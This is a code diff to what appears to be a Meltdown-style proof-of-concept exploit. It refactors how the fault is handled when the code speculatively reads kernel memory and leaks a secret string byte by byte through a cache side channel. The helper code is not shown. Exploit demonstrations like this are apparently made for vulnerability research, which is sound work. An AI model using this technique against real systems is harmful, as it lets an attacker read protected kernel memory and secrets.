@@ -22,8 +22,6 @@
 #include <fstream>
 #include <iostream>
 
-#include <signal.h>
-
 #include "cache_sidechannel.h"
 #include "instr.h"
 #include "faults.h"
@@ -55,14 +53,19 @@ static char LeakByte(const char *data, size_t offset) {
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
     size_t safe_offset = run % strlen(public_data);
-    ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));
 
-    // Access attempt to the kernel memory. This does not succeed
-    // architecturally and kernel sends SIGSEGV instead.
-    ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
+    bool handled_fault = RunWithFaultHandler([&]() {
+      ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));
 
-    // SIGSEGV signal handler moves the instruction pointer to this label.
-    asm volatile("afterspeculation:");
+      // Access attempt to the kernel memory. This does not succeed
+      // architecturally and kernel sends SIGSEGV instead.
+      ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
+    }, [](){});
+
+    if (!handled_fault) {
+      std::cerr << "Read didn't yield expected fault" << std::endl;
+      exit(EXIT_FAILURE);
+    }
 
     std::pair<bool, char> result =
         sidechannel.RecomputeScores(data[safe_offset]);
@@ -92,7 +95,6 @@ int main() {
   in >> std::dec >> private_length;
   in.close();
 
-  OnSignalMoveRipToAfterspeculation(SIGSEGV);
   std::cout << "Leaking the string: ";
   std::cout.flush();
   const size_t private_offset =
